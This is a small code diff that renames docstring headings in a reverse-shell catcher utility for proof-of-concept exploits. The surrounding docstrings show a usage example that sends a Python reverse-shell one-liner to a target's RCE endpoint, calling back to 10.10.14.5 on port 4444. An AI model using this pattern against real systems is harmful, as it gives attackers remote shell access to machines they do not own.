@@ -22,7 +22,7 @@ class ShellCatcher:
     """
     Simple reverse shell catcher for POCs.
 
-    Example:
+    Examples:
         from utils.shell_catcher import ShellCatcher
 
         # Start listener in background
@@ -366,7 +366,7 @@ def quick_catch(port=4444, trigger_func=None, trigger_delay=1):
     """
     Quick helper to catch a shell with optional trigger function.
 
-    Example:
+    Examples:
         def trigger():
             requests.get(f"http://target/rce?cmd={python_oneliner('10.10.14.5', 4444)}")
 
@@ -393,7 +393,7 @@ def auto_shell(port=4444, wait_timeout=30):
     """
     Context manager for shell catching with auto-wait.
 
-    Example:
+    Examples:
         with auto_shell(4444) as catcher:
             # Trigger exploit
             exploit_target()
